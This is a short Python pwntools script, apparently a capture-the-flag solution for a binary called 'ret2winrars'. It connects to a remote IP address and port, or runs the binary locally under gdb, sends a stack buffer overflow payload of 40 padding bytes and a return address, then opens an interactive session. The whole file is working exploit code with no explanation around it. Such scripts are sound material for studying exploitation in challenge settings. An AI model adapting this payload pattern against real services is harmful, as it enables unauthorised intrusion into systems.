from pwn import *

DEBUG = False

if DEBUG:
    r = process("./ret2winrars")
    gdb.attach(r)
else:
    r = remote("193.57.159.27", 41299)

print(r.recv())

payload = "A"*40+p64(0x0000000000401166)

r.sendline(payload)

print(r.recv())

r.interactive()